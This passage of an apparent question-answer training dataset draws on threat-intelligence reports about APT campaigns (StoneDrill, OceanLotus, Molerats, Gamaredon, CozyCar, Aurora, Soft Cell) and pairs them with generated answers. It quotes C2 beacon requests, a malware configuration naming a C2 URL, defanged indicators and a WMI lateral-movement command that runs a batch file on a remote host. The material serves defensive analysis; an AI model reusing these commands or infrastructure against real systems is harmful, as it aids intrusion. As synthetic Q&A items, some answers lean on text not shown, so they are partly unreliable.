NewsBeef\nHaving identified the StoneDrill sample through the Yara technique above, we started looking for other possibly related samples.\nOne Yara technique that has proved useful in the past for finding new malware variants is the development of Yara rules for decrypted malware components. During attacks, malware components can be changed to fit the attackers' requirements, so hunting for decrypted malware code might help in finding new malware variants or even older samples.\nWith StoneDrill, we developed several Yara rules for the decrypted payloads. Here's one of our Yara rules for a decrypted StoneDrill module:\nInterestingly, this rule allowed us to find a new category of samples, which we previously connected with a threat actor named NewsBeef. We wrote about roughly one year ago, in relation to another set of attacks against oil and energy companies from the Middle East.\nFurther analysis indicated the malware samples from StoneDrill and NewsBeef appear to be connected together through numerous internal similarities.\nThe use of simple logic in conjunction with a knowledge of Yara can help attain a state-of-the-art outcome in malware hunting activity. If you would like to learn more, you can join us for the Yara training \"\" and the advanced \"\" on April 1-2, 2017 in St. Maarten.\nSeveral private intelligence reports on Shamoon, StoneDrill and NewsBeef are available to subscribers of .\nFor more information please contact:\nQuestion: How did Kaspersky Lab leverage the 'resources' in Shamoon 2.0 to develop effective detection strategies, and what specific attributes were used to identify potential new variants?",
    "output": "Answer: Kaspersky Lab utilized the encrypted resources within Shamoon 2.0 to develop detection strategies. They noticed that Shamoon wipers store additional payloads as encrypted resources. Early samples used specific resource names like 'PKCS7', 'PKCS12', and 'X509', making them easier to detect. Newer versions used random names, but the presence of a resource named '101' with high entropy, a size around 30 KB, and neutral language settings was a consistent pattern. By focusing on these attributes, such as the use of Windows API functions like FindFirstFile, FindNextFile, FindResource, and LoadResource, and setting limits on file size and the number of resources, they created a Yara rule to hunt for new variants.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Attribution\nIn this APT, the threat actor was very aware of the risks of exposure and tried to combat attribution as much as possible. This is often the case in this type of large-scale cyber espionage operations. At the time of the attack, there weren't many classic indicators of compromise (IOCs) that could lead to attribution. However, at the same time, the threat actors behind Operation Cobalt Kitty left enough \"behavioral fingerprints\" to suspect the involvement of the OceanLotus Group (which also goes by the names APT-C-00, SeaLotus and APT32), which was first documented by and further researched by other security companies, including 's report. Reports of the group's activity in Asia , attacking Chinese entities. Over the years, the group was observed attacking a wide spectrum of targets in other Asian countries (Philippines and Vietnam). Cybereason concludes that the tactics, techniques and procedures (TTPs) observed throughout operation Cobalt Kitty are consistent with the group's previous APT campaigns in Asia.\nThe Lotus Group appears to have a tendency of using similar and even identical names for their payloads (seen in their PowerShell payloads, Denis backdoor and fake Flash installers). In addition, they also used similar anonymization services for their domains repeatedly. That type of \"small\" details also played a role in attributing Operation Cobalt Kitty to the OceanLotus Group.\nLastly, during the investigation, Cybereason noticed that some of the C&C domains and IPs started to emerge on VirusTotal and other threat intelligence engines, with payloads that were not observed during Cobalt Kitty. This was a cutting proof that Cobalt Kitty was not an isolated APT, but part of something bigger. Example of the C&C domains and IPs used by the group across different APT campaigns and caught in the wild:\nSome of these domains were also mentioned in FireEye's , further confirming our suspicions that the group behind the attack is the OceanLotus Group.\nThe group includes members who are fluent in at least two Asian languages. This claim is supported by the language used in the spear-phishing emails, which appear to be written by native speakers. In addition, the language localization settings found in few of the payloads suggest that the malware authors compiled the payloads on machines with Asian languages\nsupport. The threat actors are not likely native English speakers since multiple typos were found in their payloads.\nFor example, the following typo was observed in the file metadata of one of the backdoors.\nNotice the \"Internal Name\" field (\"Geogle Update\"):\nRead the text above and answer this question: What evidence supports the claim that the OceanLotus Group is involved in Operation Cobalt Kitty, and how does the emergence of new C&C domains and IPs on threat intelligence platforms confirm this?",
    "output": "Several pieces of evidence support the claim that the OceanLotus Group is involved in Operation Cobalt Kitty. Firstly, the tactics, techniques, and procedures (TTPs) observed during Operation Cobalt Kitty are consistent with the group's previous APT campaigns in Asia. Secondly, the group has a tendency to use similar naming conventions for their payloads and anonymization services, which were observed in Cobalt Kitty. Furthermore, during the investigation, some of the C&C domains and IPs started to emerge on VirusTotal and other threat intelligence engines with payloads that were not observed during Cobalt Kitty. This indicated that Cobalt Kitty was part of a larger campaign. Some of these domains were also mentioned in FireEye's reports, further confirming the suspicion that the OceanLotus Group was behind the attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Threat attribution\nWe have attributed the attack to Molerats APT group based on following observations:\n1. Use of open-source as well as commercial packers for the backdoor (ConfuserEx, Themida)\n2. Targeting middle-east region\n3. Using Dropbox API for entire C2 communication\n4. Using RAR files for backdoor delivery as well as in later stages\n5. Using other legit cloud hosting services like Google Drive to host the payloads\n6. Overlap of domain SSL Certificate thumbprint observed on current attack infrastructure with domains used by Molerats APT group in the past\n7. Overlap of Passive DNS resolution of domain observed on current attack infrastructure with the IP used by Molerats APT group in the past\nMedium Headline: # Dynamic analysis\nThe main function of the binary is the standard ConfuserEx function which is responsible for loading the runtime module \"koi'' that is stored in encrypted form using a byte array. Once the module is loaded, the main function resolves the module's entry point function using the metadata token and invokes it by providing required parameters.\nFigure 4: Code snippet loading the runtime module and invoking it's entry point function\nThe runtime module (\"koi\") on analysis is found to be a backdoor. Before calling the main function of the module, the code from within the constructor is called which creates a new thread that regularly monitors the presence of a debugger.\nOnce the debugger monitor thread is created we get the code execution flow to the main function of the module which ultimately leads to the backdoor execution. Within the main function the backdoor performs following operations:\n1. Collects the machine manufacture and machine model information using WMI which is used for execution environment checks and is later exfiltrated to C2 server.\n2. Checks if it should execute in the current execution environment.\n3. Creates a mutex with the name of executing binary.\n4. Checks if the mutex is created successfully.\n5. Determines if it is executed for the first time using the registry key value \"HKCU/Software/{name_of_executing_binary}/{name_of_executing_binary}\".\n6. If the registry key doesn't exist, the code flow goes via a mouse check function which executes the code further only if it detects a change in either of the mouse cursor coordinates. In the end, the mouse check function also creates the same registry key.\nSmall Headline: Figure 7: Encoded string\nExecuting further the backdoor collects the following information from victim machine:\n1. Machine IP address: By making a network request to \"https://api.ipify.org\"\n2. UserName: From the environment variable\n3. HostName: Using the API call Dns.GetHostName()\nThe collected information is then processed and stored inside a variable named \"UserInfo\" by performing following operations:\n1. Concatenation (IP+UserName+HostName)\n2. Base64 string encode\n3. Substitution (Substitute \"=\" with \"1\")\n4. String reverse\nNext the backdoor sends following network requests in the specified sequence using the Dropbox API and correspondingly performs any required operations:\nMedium Headline: 4. List Content:\nList the content of root directory (which is attacker controlled) and extract the following information:\na) File name of any hosted RAR archive\nb) File name of any hosted exe (Which is found to be the legitimate RAR command-line utility and is used to extract the downloaded RAR archive in case the machine doesn't already have any RAR archive supporting application)\nc) File name of any hosted pdf or doc file (Used as decoy document)\nd) File name of any non specific file type (Based on our analysis it contains the secondary Dropbox account token that is used for file exfiltration from victim machine)\nNote: The above extracted information is stored locally and is used wherever required.\nFinally, if the backdoor executed for the first time, it downloads and opens the hosted pdf or doc file and then calls two other functions where the first function creates a thread that continuously communicates with the Dropbox account to fetch and execute the C2 commands while the second function creates a thread that downloads and executes the RAR archive using the information extracted earlier.\nBig Headline: C2 infrastructure analysis\nWhile monitoring the IPs used during the current attack we observed the domain \"msupdata.com\" started to resolve to the IP 45.63.49[.]202 from 27-12-2021. We found two Historical SSL Certificates associated with this domain. Pivoting on the SSL Certificate with thumbprint \"ec5e468fbf2483cab74d13e5ff6791522fa1081b\" we found domains like \"sognostudio.com\", \"smartweb9.com\" and others which were all attributed to Molerats APT group during past attacks.\nAdditionally, the subdomain \"www.msupdata.com\" also has a Passive DNS resolution to IP 185.244.39[.]165 which is also associated with Molerats APT group in the past.\nNote: We didn't observe any activity related to the domain \"msupdata.com\" or it's subdomain \"www.msupdata.com\" until this blog release.\nMedium Headline: Account 5:\nName: pla inod\nCountry: PS (Palestine)\nEmail: palinfo.arabic@gmail[.]com\nAlso, while analyzing the exfiltrated data from Dropbox accounts we found a screenshot of the attacker machine which was likely uploaded while the attacker was testing the malware. We correlated a number of artifacts and patterns with the file names visible from the snapshot to those used during the real attack. Moreover, from the snapshot the attacker seems to be using a simple GUI application to sync with the Dropbox account and display the victims list. In the victims list, the user name \"mijda\" is also present which matches with the name of document creator \"mij daf\" for all the documents we found during this attack.\nBig Headline: Old attack chain\nAs per our analysis the old attack chain was used from 13th July 2021(Start of campaign) to 13th Dec 2021.\nFigure 9 below illustrates the old attack chain.\nFigure 9: Attack chain\nThe major difference between the new attack chain and the old attack chain is seen in the backdoor delivery. Although we are not sure how these RAR/ZIP files were delivered but considering the past attacks they were likely delivered using Phishing PDFs. Additionally, we found a minor variation in the way the backdoor extracted the primary Dropbox account token. In the old attack chain the backdoor fetched the encoded string containing the\nprimary Dropbox account token from attacker-hosted content on \"justpaste.it\". Figure 10 below shows the attacker-hosted encoded string that contains the Dropbox account token and also describes the corresponding format.\nQuestion: What specific techniques does the Molerats APT group use to exfiltrate data from the victim's machine, and how is this data processed before being sent to the C2 server?",
    "output": "Answer: The Molerats APT group exfiltrates data from the victim's machine by collecting the machine IP address, username, and hostname. This information is then processed through a series of operations: concatenation (IP + UserName + HostName), Base64 encoding, substitution ('=' with '1'), and string reversal. The backdoor then sends network requests using the Dropbox API to list the content of the root directory, which is controlled by the attacker. It extracts information such as file names of hosted RAR archives, executables, decoy documents, and secondary Dropbox account tokens. This information is stored locally and used as needed. If the backdoor is executed for the first time, it downloads and opens a decoy document, then creates threads for continuous communication with the Dropbox account to fetch and execute C2 commands, and to download and execute RAR archives.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Conclusion\nGamaredon has been targeting Ukrainian victims for almost a decade. As international tensions surrounding Ukraine remain unresolved, Gamaredon's operations are likely to continue to focus on Russian interests in the region. This blog serves to highlight the importance of research into adversary infrastructure and malware, as well as community collaboration, in order to detect and defend against nation-state cyberthreats. While we have mapped out three large clusters of currently active Gamaredon infrastructure, we believe there is more that remains undiscovered. Unit 42 remains vigilant in monitoring the evolving situation in Ukraine and continues to actively hunt for indicators to put protections in place to defend our customers anywhere in the world. We encourage all organizations to leverage this research to hunt for and defend against this threat.\nMedium Headline: Protections and Mitigations\nThe best defense against this evolving threat group is a security posture that favors prevention. We recommend that organizations implement the following:\nSearch network and endpoint logs for any evidence of the indicators of compromise associated with this threat group.\nEnsure cybersecurity solutions are effectively blocking against the active infrastructure IoCs identified above.\nImplement a DNS security solution in order to detect and mitigate DNS requests for known C2 infrastructure.\nApply additional scrutiny to all network traffic communicating with AS 197695 (Reg[.]ru).\nIf you think you may have been compromised or have an urgent matter, get in touch with the (<http://start.paloaltonetworks.com/contact-unit42.html>)Unit 42 Incident Response team or call North America Toll-Free: 866.486.4842 (866.4.UNIT42), EMEA: +31.20.299.3130, APAC: +65.6983.8730, or Japan: +81.50.1790.0200.\nFor Palo Alto Networks customers, our products and services provide the following coverage associated with this campaign:\nprotects endpoints from the malware techniques described in this blog.\ncloud-based threat analysis service accurately identifies the malware described in this blog as malicious.\nUsers of  contextual threat intelligence service can view malware associated with these attacks using the (<https://autofocus.paloaltonetworks.com/#/tag/Unit42.GamaredonGroup>)Gamaredon Group tag.\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about the (<http://www.cyberthreatalliance.org/>)Cyber Threat Alliance.\n\nHow can organizations effectively defend against the evolving threat posed by the Gamaredon group? Explain the key strategies and technologies recommended.",
    "output": "A: Organizations can effectively defend against the evolving threat posed by the Gamaredon group by implementing a multi-layered security posture that favors prevention. Key strategies and technologies recommended include searching network and endpoint logs for any evidence of the indicators of compromise associated with this threat group. Ensuring cybersecurity solutions are effectively blocking against the active infrastructure IoCs identified is crucial. Implementing a DNS security solution to detect and mitigate DNS requests for known command and control (C2) infrastructure is another important step. Additionally, applying additional scrutiny to all network traffic communicating with AS 197695 (Reg[.]ru) can help in identifying suspicious activities. For Palo Alto Networks customers, utilizing products like Cortex XDR to protect endpoints from the malware techniques described, WildFire cloud-based threat analysis service to accurately identify the malware, and AutoFocus contextual threat intelligence service to view malware associated with these attacks using the Gamaredon Group tag are effective measures. Sharing findings and indicators of compromise with fellow Cyber Threat Alliance members also helps in rapid deployment of protections and systematic disruption of malicious cyber actors.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How could the threat actors behind the Sea Turtle campaign potentially utilize Process Injection: Process Hollowing to evade detection and maintain persistence in the targeted networks?",
    "output": "Process Injection: Process Hollowing is a technique used by adversaries to inject malicious code into suspended and hollowed processes, allowing them to evade process-based defenses. In the context of the Sea Turtle campaign, the threat actors demonstrated a high level of sophistication and ability to adapt to various security measures. One potential way they could utilize Process Injection: Process Hollowing is by creating a legitimate process on a compromised system, suspending it, and then unmapping its memory to replace it with malicious code. This would enable them to execute arbitrary code in the address space of a separate live process, potentially evading detection from security products. Furthermore, since the injected process would inherit the security context of the injecting process, it would likely not result in elevated privileges, but it would still allow the threat actors to maintain persistence in the targeted network. Given the threat actors' ability to impersonate VPN applications and perform MitM attacks, it is possible that they could use Process Injection: Process Hollowing to inject malicious code into legitimate processes, making it even more challenging for security products to detect their activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: The Initial Droppers: Decoy and Downloader\nThe current CozyCar campaign includes spear phishing emails that deliver the payload from either by a link to a .zip file on a compromised website or by direct delivery as an attachment to the phish.\nAt the time of our analysis, the phishing link was no longer active. When a user opens the attached file a poorly detected executable file [VT 1/54] is extracted. The initial dropper is a self-extracting archive (SFX). Upon execution, this executable file will drop two files in the %TEMP% directory: a decoy .wav file and the secondary dropper.\nThe CozyDuke group commonly uses legitimate media files to trick users. In reality, while the media \u2014 a .wav file with a female voice claiming to be a reporter looking for commentary \u2014 is played, the secondary dropper executes in the background. The secondary dropper requests a .swf file using SSL as illustrated in the HTTP traffic below.\nAs of this writing, the domain extranet.qualityplanning[.]com resolved to 64.244.34[.]200.\nGET /webscriptsecurity/view/4/player.swf HTTP/1.1\nAccept: text/html,application/xhtml+xml,*/* Accept-Language: en_US User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727) Host: extranet.qualityplanning[.]com Connection: Keep-Alive\nGET /webscriptsecurity/view/4/player.swf HTTP/1.1\nAccept: text/html,application/xhtml+xml,*/*\nAccept-Language: en_US\nUser-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\nHost: extranet.qualityplanning[.]com\nConnection: Keep-Alive\nThe secondary dropper then cleans up after itself with a simple vbs script (md5:0d132ee171768dc30d14590ed2dbadd1) that leaves only the decoy multimedia file behind. But what did the dropper do with the .swf file?\nMedium Headline: The Real Payload\nWhile the player.swf file downloaded by the second stage dropper does contain media, it is, again, a decoy.\nThe actual flash component of this file is roughly 16kb, leaving approximately 200kb of the file unaccounted for. The second stage dropper contains decoding routines that decode the arbitrary binary data into an executable file.\nThe executable file is dropped in %appdata%/Roaming and appears to try and emulate legitimate software names: TimbuktuDaemon, SearchIndexer, RtkAudioService64, dirmngr, o2flash, and usbrefs64. This file was not observed on VirusTotal until July 9 and has extremely low detection rates [VT: 3/54].\nIt appears that the authors of this particular iteration of the CozyCar group's malware internally call it \"miniDionis\" according to pdb strings left in the binary\n(c:\\BastionSolution\\Shells\\Projects\\miniDionis4\\miniDionis\\obj\\Release\\miniDionis.pdb). It also appears to be an iteration on the \"forkmeimfamous\" aka Seaduke malware analyzed by Unit 42 in a previous blog [4].\nThe malware stores 2 files in the %temp% directory: a configuration file and a secondary dll. The configuration file's name matches the final characters of the bot_id that is contained within as per the sample below:\n{\n] }\n\"bot_id\": \"8C9U-01MRLXW\",\n\"host_scripts\": [\n\"https://www.illuminatistudios.net/mobile/viewer.php\"\n{\nAnalysis of the secondary dll file (name matches [A-Z0-9]{1}\\.tmp) indicates that its primary function is to serve as a cleanup mechanism for the dropped binary. This is likely an attempt to thwart forensic investigations.\nFurther examination of memory dumps taken following the execution of miniDionis reveals some clues into the beaconing activity exhibited. The malware stores configuration values in memory as key:value pairs:\nThe configuration of miniDionis is a JSON blob with several important sections, which are described in the table below:\nMedium Headline: Network Communications\nThe functional payload of this Trojan starts by creating a Mutex by splitting the \"bot_id\" value in the configuration on the hyphen (\"-\") and using the second portion of the split string (specifically, \"01MRLXW\" in the case of this configuration).\nFrom a functionality standpoint, the Trojan uses the concept of tasks that are processed and completed using a pool of threads. To obtain tasks, the Trojan will issue an HTTPS request to the C2 server (\"host_scripts\" in the configuration) that resembles the following example beacon:\nGET /mobile/viewer.php HTTP/1.1\nAccept: */*\nAccept-Language: en-US\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\nHost: www.illuminatistudios[.]net\nCookie: SSID=sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8-25A\nAccept-Encoding: gzip, deflate\nConnection: Keep-Alive\nGET /mobile/viewer.php HTTP/1.1\nAccept: */*\nAccept-Language: en-US\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\nHost: www.illuminatistudios[.]net\nCookie: SSID=sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8-25A\nAccept-Encoding: gzip, deflate\nConnection: Keep-Alive\nThe Trojan manually creates the cookie in this HTTP request. The cookie contains ciphertext that the Trojan creates based on the \"bot_id\" in the JSON configuration. The Trojan compresses the \"bot_id\" string using zlib and then encrypts it using the RC4 algorithm using a generated key. The generated key is a SHA1 hash of two randomly created strings: the first of which is between 2 and 8 bytes long and the second is between 1 and 7 characters in length.\nThe ciphertext of the \"bot_id\" is then based64 encoded and finally the appended to the \"cookie_name\" (\"SSID=\") in the configuration and sent within the HTTP request to the C2 server.\nUnit 42 did not observe the first random string (between 2 and 8 characters in length) sent to the C2 in the first beacon, which would be required by the C2 to reproduce the exact SHA1 hash used as a key to generate the ciphertext in the cookie. Upon further examination we believe that the C2 will not be able to decrypt the cookie in the first beacon. Instead, the C2 will respond to the first beacon with data that the Trojan will use to extract a string, using a function named TrExtractKey seen in Figure 2, to replace the first random string used to generate the SHA1 hash.\nOnce the C2 and Trojan have synchronized using this string, the C2 will be able to decrypt subsequent network beacons because the Trojan includes the random string between 1 and 7 characters that makes up the second half of the SHA1 hash within the cookie field before the ciphertext.\nThe C2 communications, and several of the commands we will discuss in this blog, include a rather interesting technique to manually handle HTTP redirection, such as the HTTP 301 Moved Permanently and HTTP 302 Found status codes.\nThe technique used to handle these redirections involves checking for the presence of a \"Location\" field within the HTTP headers of the server response, then using regular expressions to parse the HTML within server response to find the appropriate URL.\nThe code contains three regular expressions to parse the HTML to locate the URL, the first of which is \"<a.*?>.*?</a>\" that locates all of the tags associated with link within the HTML.\nThe second regular expression of \"onclick=\\\"Accept();\\\"\" locates only links within the HTML with a specific \"onclick\" action.\nThe last regular expression of \"href\\\\s*=\\\\s*(?:[\\\"'](?<1>[^\\\"']*)[\\\"']|(?<1>\\\\S+))\" to obtain the correct URL to interact with as the C2 server.\nMedium Headline: Command handler\nOnce the C2 and Trojan have synchronized and can decrypt their network communications the C2 server will begin responding to beacons from the Trojan with JSON blobs.\nUnit 42 has not received any JSON blobs from an active C2 server, but based on static analysis of the Trojan determined the JSON would look as follows:\nThe Trojan takes this JSON blob and adds each task in the list into a pool for processing. Separate worker threads access this pool of tasks and process the commands and perform the necessary activities.\nUnit 42 analyzed the Trojan's command handler and found several commands, as seen in Table 2, which allows the threat actors to carry out a full range of activities on the system.\nBig Headline: Conclusion\nThe actors behind the CozyDuke framework are highly sophisticated, motivated, and have become increasingly bold in their campaigns.\nWe recommend that other security practitioners review the included Indicators of Compromise (IoCs) to ensure they have not been targets in this campaign, and add the appropriate security controls to prevent future attacks.\nThis group is reliant on social engineering, and thus, user education remains of paramount importance.\nPalo Alto Networks customers using WildFire were protected from this campaign. All known elements of this campaign have been accurately identified by WildFire as malicious.\n\nWhat techniques does the CozyCar malware employ to evade detection and thwart forensic investigations?",
    "output": "A: The CozyCar malware employs several techniques to evade detection and thwart forensic investigations. It uses legitimate media files as decoys to distract users while the secondary dropper executes in the background. The malware drops executable files with names that mimic legitimate software to blend in with normal system processes. Additionally, it uses a secondary DLL file to clean up the dropped binary, making it harder for investigators to trace the infection. The malware also uses encryption and obfuscation techniques in its network communications to make it difficult for security analysts to understand its behavior.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Overview\nFollowing the public disclosures of electronic attacks launched against Google and several other businesses, subsequently referred to as \"Operation Aurora\", Damballa conducted detailed analysis to confirm that existing customers were already protected and to ascertain the sophistication of the criminal operators behind the botnet.\nThere has been much media attention and speculation as to the nature of the attacks. Multiple publications have covered individual aspects of the threat \u2013 in particular detailed analysis of forensically recovered malware and explanations of the Advanced Persistent Threat (APT).\nBy contrast, Damballa has been able to compile an extensive timeline of the attack dating back to mid-2009 that identifies unique aspects to the Aurora botnet that have been previously unknown. Based upon this new information and our experience in dealing with thousands of enterprise-targeted botnets, Damballa believes that the criminal operators behind the attack are relatively unsophisticated compared other professional botnet operators. Even so, the results proved just as damaging as a sophisticated botnet since the threat was not quickly identified and neutralized.\nKey observations discussed in the main body of this analysis report:\n\u2022 The major pattern of attacks previously identified as occurring in mid-December 2009 targeting Google appear to originate in July 2009 from mainland China.\n\u2022 Hosts compromised with Aurora botnet agents and rallied to the botnet Command-and-Control (CnC) channels were distributed across multiple countries before the public disclosure of Aurora, with the top five countries being the United States, China, Germany, Taiwan and the United Kingdom.\n\u2022 Damballa identified additional botnet CnC domains used by these criminal operators and established a timeline of malware associations back to May 2nd 2009 by tracking the evolution of the malware used by Aurora's operators.\n\u2022 Analysis of network traffic associated with the lookups of the botnet CnC is not consistent with the publicly discussed Internet Explorer 6 infection vector.\n\u2022 This botnet has a simple command topology and makes extensive use of Dynamic DNS (DDNS) CnC techniques. The construction of the botnet would be classed as \"old-school\", and is rarely used by professional botnet criminal operators any more. Reliance upon DDNS CnC is typically associated with new and amateur botnet operators\n\u2022 The criminals behind the Google attack appear to have built and managed a number of separate botnets and run a series of targeted attack campaigns in parallel. This conclusion is based upon CnC domain registration and management information. The earliest of the CnC domains associated with these botnets, reliant upon DDNS service provisioning, appear to have been registered on July 13th 2009.\n\u2022 The botnet operators had access to large numbers of CnC hosts in geographically diverse hosting co-locations from the very start \u2013 a fairly high cost for a botnet. Further, the botnet employed over a dozen domains in diverse DDNS networks for CnC. Some of the botnet agents focused on victims outside of Google, suggesting that each domain might have been dedicated to a distinct class or vertical of victims.\n\u2022 Only the US victims of the attack were compelled to perform mail-based DNS queries \u2013 an event that would typically indicate attempted document exfiltration via email services.\n\u2022 Damballa identified multiple CnC testing, deployment, management and shutdown phases of the botnet CnC channels. Some of the CnC domains appear to have become dormant for a period of time after they infected victim systems. This type of activity can sometimes be associated with an update to the botnet malware, or when the criminal operator sells/trades a segment of the botnet to another criminal operator.\n\u2022 The botnet operators behind the Aurora attacks deployed other malware families prior to the key Trojan.Hydraq release. Some of these releases overlapped with each other. Two additional families of malware (and their evolutionary variants) were identified as \"Fake AV Alert / Scareware \u2013 Login Software 2009\" and \"Fake Microsoft Antispyware Service,\" both of which employed fake antivirus infection messages to socially engineer victims into installing malicious botnet agents.\nBy studying the evolution of the Google attacks and tracking the malicious campaigns conducted before (and in parallel to) the public disclosure of \"Operation Aurora\" in January 2010, Damballa has established a detailed timeline of infections. Instead of this attack being a sophisticated APT operation, it appears that the attacks originated from a Chinese botnet operations team, and that the attack vector underwent several different phases of botnet building and malware deployment before being discovered by Google.\nThe fact that some of the later attacks utilized a different family of malware and may have exploited Zero-Day vulnerabilities within Internet Explorer 6 as one of the infection vectors is typical for modern botnet distribution campaigns. Botnet operators also increasingly trade or sell segments of the botnets they build. Once sold, the owner of the botnet typically deploys a new suite of malware onto compromised systems. The CnC provides the link between various campaigns run by the botnet operators and the multiple malware iterations. Since Damballa focuses on malicious, remote-controlled crimeware that depends on CnC to function, we were able to determine the evolution and sophistication of the Aurora botnet and its operators with greater detail and accuracy than other reports to-date.\nIn general, Aurora is \"just another botnet\" and typifies the advanced nature of the threat and the criminal ecosystem that supports it. It is important to note, however, that botnets linked to the criminal operators behind Aurora may have been sold or traded to other botnet operators, either in sections or on an individual victim basis. This kind of transaction is increasingly popular. Specialist botnet builders sell access to victim systems or networks for a fee \u2013 making it very simple for other entities to access confidential business systems and information without needing be technologically proficient. These transactions between criminals are very difficult to detect.\nMedium Headline: Report Objectives\nThe purpose of this report is to explain the advanced state of today's botnet ecosystem by way of example, and to examine the ways in which criminal operators rely upon botnet technologies to breach corporate networks and extract secrets from their victims. Much media fervor has surrounded Google's public disclosure of the successful attacks against their systems. 33 other victims also fell prey to what has been frequently referred to as an Advanced Persistent Threat (APT). This report closely examines the methods employed by the criminal operators who conducted this botnet campaign.\nMany security vendors have explained the operation against Google, dubbed \"Operation Aurora,\" using a military vernacular. However, based upon analysis of exhaustive data surrounding these attacks and examination of both the malware and the CnC topologies used by the criminals behind Aurora, it appears that this threat can best be classified as a just another common botnet attack \u2013 and one that is more amateur than average.\nThis report details new analysis of the malware evolution and the CnC construction behind these attacks, and provides unique insight into similar threats facing large business. Comparisons are made between the Aurora attacks and professionally orchestrated campaigns run by sophisticated cyber criminals. Timelines track the evolution of this threat help to identify the objectives of the criminals behind the Aurora attacks, and illustrate the advanced state of the botnet ecosystem.\nMedium Headline: Understanding Aurora\nMalware samples recovered from victim systems using forensic techniques lie at the heart of almost all public analysis of Aurora. The samples directly associated with Aurora are commonly referred to as Trojan.Hydraq. Damballa analyzed the Trojan.Hydraq outbreak using DNS monitoring logs obtained from CnC authority DNS servers. Since every infected host in the Aurora botnet contacted the\nauthority server, DNS logs provided a rich inventory of the botnet's resolution behavior. The logs also delivered insights into the development, gestation and growth of the Aurora botnet. This data leads to several interesting questions:\nOrigins \u2013 Which network first resolved the botnet CnC domains? Who was the first victim? Are there clues in the first DNS lookups as to the authors or origin of the network?\nThe analysis below shows that a university in China, and a Chinese collocation facility (colo), were critical early incubators of the infection. Portions of the infection originated from within Google China's offices.\nRemediation and Damage Assessment \u2013 Who else resolved the botnet CnC domains before news of the malware became public? What were the victim systems forced to do?\nPublic accounts state that the botnet harvested email information. The DNS log analysis reveals numerous MX-lookups (mail-related DNS lookups). If these lookups are related to document theft, it is reasonable to estimate the number and timing of attempted exfiltration events. In addition to the type of DNS traffic, the log analysis also reveals where the victims are located.\nAlmost all (99%) of these events took place inside Google's US network. No victim in any other country performed MX lookups, suggesting Aurora's data exfiltration targets were all in the U.S. The pattern of MX lookups appears automated and lacks any diurnal properties.\nCapabilities \u2013 What else does DNS log analysis suggest, and what other questions does it raise about the attack?\nDamballa's analysis helps illumine the origin of the botnet, based on years of observing the authority servers used in the Aurora CnC.\n\nBased on the above text, answer a question. How did Damballa establish a timeline of the Aurora botnet's evolution and what key observations were made regarding its initial activities?",
    "output": "Damballa established a timeline of the Aurora botnet's evolution by tracking the registration and management of CnC domains and analyzing the evolution of the malware used by Aurora's operators. Key observations included that the major pattern of attacks targeting Google appeared to originate in July 2009 from mainland China, and that the earliest CnC domains associated with these botnets were registered on July 13th, 2009. Additionally, Damballa identified that the botnet operators had access to a large number of CnC hosts in geographically diverse hosting co-locations from the very start.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Key Points\nEarlier this year, Cybereason identified an advanced, persistent attack targeting telecommunications providers that has been underway for years, soon after deploying into the environment.\nCybereason spotted the attack and later supported the telecommunications provider through four more waves of the advanced persistent attack over the course of 6 months.\nBased on the data available to us, Operation Soft Cell has been active since at least 2012, though some evidence suggests even earlier activity by the threat actor against telecommunications providers.\nThe attack was aiming to obtain CDR records of a large telecommunications provider.\nThe threat actor was attempting to steal all data stored in the active directory, compromising every single username and password in the organization, along with other personally identifiable information, billing data, call detail records, credentials, email servers, geo-location of users, and more.\nThe tools and TTPs used are commonly associated with Chinese threat actors\nDuring the persistent attack, the attackers worked in waves- abandoning one thread\nof attack when it was detected and stopped, only to return months later with new tools and techniques.\nSmall Headline: Initial Compromise: the Modified China Chopper Web Shell\nThe initial indicator of the attack was a malicious web shell that was detected on an IIS server, coming out of the w3wp.exe process. An investigation of the web shell, later classified as a modified version of the uncovered several attack phases and TTPs. The threat actor was able to leverage the web shell to run reconnaissance commands, steal credentials, and deploy other tools.\nMalicious web shell activity as observed in the Cybereason solution.\nCommands executed via a modified version of the China Chopper web shell.\nBig Headline: Modified Mimikatz\nFollowing the reconnaissance phase, the threat actor attempted to dump credentials stored on the compromised machines. The most common credential stealing tool used by the threat actor was a modified that dumps NTLM hashes. This version of mimikatz did not require any command line arguments, most likely in an attempt to avoid detection based on command-line auditing. The dumped hashes were used to authenticate to other machines via pass the hash. We renamed this sample to maybemimi.exe.\nModified Mimikatz that dumps NTLM hashes.\nReverse engineering shows the similarity between maybemimi.exe and mimikatz.\nMimikatz code from .\nmaybemimi strings.\nBig Headline: Lateral Movement\nOnce the threat actor mapped the network and obtained credentials (through net use), they began to move laterally. They were able to compromise critical assets including production servers and database servers, and they even managed to gain full control of the Domain Controller. The threat actor relied on and to move laterally and install their tools across multiple assets.\nThe following example demonstrates how the threat actor moved laterally from the first machine, compromised by the modified version of the , to other machines inside the network.\n/c cd /d \"C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\ecp\\auth\\\"&wmic /node:[REDACTED] /user:\"[REDACTED]\" /password:\"[REDACTED]\" process call create a.bat&echo [S]&cd&echo [E]\nWMI command used by the threat actor to move laterally.\nBig Headline: Maintaining a Long-term Foothold and Stealing Data\nThe threat actor abused the 